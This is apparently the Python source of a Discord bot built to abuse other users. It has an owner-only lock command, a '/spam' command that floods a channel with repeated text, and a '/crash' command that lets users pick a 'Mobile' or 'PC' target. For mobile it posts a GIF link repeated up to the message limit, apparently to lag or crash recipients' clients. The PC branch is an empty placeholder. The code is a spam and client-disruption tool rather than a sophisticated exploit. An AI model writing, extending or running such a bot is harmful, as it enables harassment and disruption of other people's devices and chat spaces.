import discord
from discord import app_commands
import os

class CrashAmountModal(discord.ui.Modal):
    amount_input = discord.ui.TextInput(
        label="Amount", 
        placeholder="Enter how many times to execute...",
        min_length=1,
        max_length=3,
        required=True
    )

    def __init__(self, platform: str, client_instance):
        super().__init__(title=f"Execute Protocol: {platform.upper()}")
        self.platform = platform
        self.client = client_instance

    async def on_submit(self, interaction: discord.Interaction):
        try:
            amount = int(self.amount_input.value)
        except ValueError:
            await interaction.response.send_message("❌ Please enter a valid number for the amount!", ephemeral=True)
            return

        if amount <= 0 or amount > 100:
            await interaction.response.send_message("❌ Amount must be between 1 and 100!", ephemeral=True)
            return

        if self.platform == "mobile":
            mobile_image_url = "https://cdn.discordapp.com/attachments/1559201133036314716/1561416786266558665/giphy.gif?ex=6ad64633&is=6ad4f4b3&hm=eb58358036ff2842ed47acffa0943900d0bd9e978da661352eae098054882a53&"
            payload = f"{mobile_image_url}\n" * amount
            
            if len(payload) > 2000:
                await interaction.response.send_message("❌ Total characters exceed Discord's 2000 limit. Reduce the amount!", ephemeral=True)
            else:
                await interaction.response.send_message(payload)

        elif self.platform == "pc":
            await interaction.response.send_message(f"💻 Executing PC protocol {amount} times...")

class PlatformDropdown(discord.ui.Select):
    def __init__(self, client_instance):
        self.client = client_instance
        options = [
            discord.SelectOption(label="Mobile", description="Target Mobile clients", emoji="📱", value="mobile"),
            discord.SelectOption(label="PC", description="Target PC clients", emoji="💻", value="pc")
        ]
        super().__init__(placeholder="Choose a platform target...", min_values=1, max_values=1, options=options)

    async def callback(self, interaction: discord.Interaction):
        if self.client.is_locked and str(interaction.user.id) != self.client.MY_USER_ID:
            await interaction.response.send_message("❌ This app is currently locked by its creator!", ephemeral=True)
            return

        selected_platform = self.values[0]
        await interaction.response.send_modal(CrashAmountModal(platform=selected_platform, client_instance=self.client))

class DropdownView(discord.ui.View):
    def __init__(self, client_instance):
        super().__init__(timeout=60)
        self.add_item(PlatformDropdown(client_instance))

class MyClient(discord.Client):
    def __init__(self):
        super().__init__(intents=discord.Intents.default())
        self.tree = app_commands.CommandTree(self)
        self.MY_USER_ID = "1240560087681073205"
        self.is_locked = False

    async def setup_hook(self):
        print("Syncing slash commands...")
        await self.tree.sync()
        print("✅ Slash commands successfully synced globally!")

    async def on_ready(self):
        print(f'Logged in as {self.user}!')

client = MyClient()

@client.tree.command(name="lockapp", description="Toggle the app lock state (Owner only)")
async def lockapp(interaction: discord.Interaction):
    if str(interaction.user.id) != client.MY_USER_ID:
        await interaction.response.send_message("❌ You are not the owner of this app!", ephemeral=True)
        return

    client.is_locked = not client.is_locked
    status = "🔒 LOCKED (Only you can use it)" if client.is_locked else "🔓 UNLOCKED (Anyone can use it)"
    await interaction.response.send_message(f"App status updated: {status}", ephemeral=True)

@client.tree.command(name="spam", description="Spam messages within Discord user limits")
@app_commands.describe(amount="How much (Max 2000)", message="The text to spam")
async def spam(interaction: discord.Interaction, amount: int, message: str):
    if client.is_locked and str(interaction.user.id) != client.MY_USER_ID:
        await interaction.response.send_message("❌ This app is currently locked by its creator!", ephemeral=True)
        return

    if amount > 2000:
        await interaction.response.send_message("❌ Keep it under 2000!", ephemeral=True)
        return

    spam_block = f"{message}\n" * amount
    if len(spam_block) > 2000:
        await interaction.response.send_message("❌ Exceeds Discord's 2000 character limit!", ephemeral=True)
        return

    await interaction.response.send_message(spam_block)

@client.tree.command(name="crash", description="Select a platform target and amount")
async def crash(interaction: discord.Interaction):
    if client.is_locked and str(interaction.user.id) != client.MY_USER_ID:
        await interaction.response.send_message("❌ This app is currently locked by its creator!", ephemeral=True)
        return

    await interaction.response.send_message("Please select your target platform below:", view=DropdownView(client), ephemeral=True)

BOT_TOKEN = os.environ.get('DISCORD_TOKEN')
if BOT_TOKEN is not None:
    client.run(BOT_TOKEN)
else:
    print("❌ Error: 'DISCORD_TOKEN' environment variable is missing!")
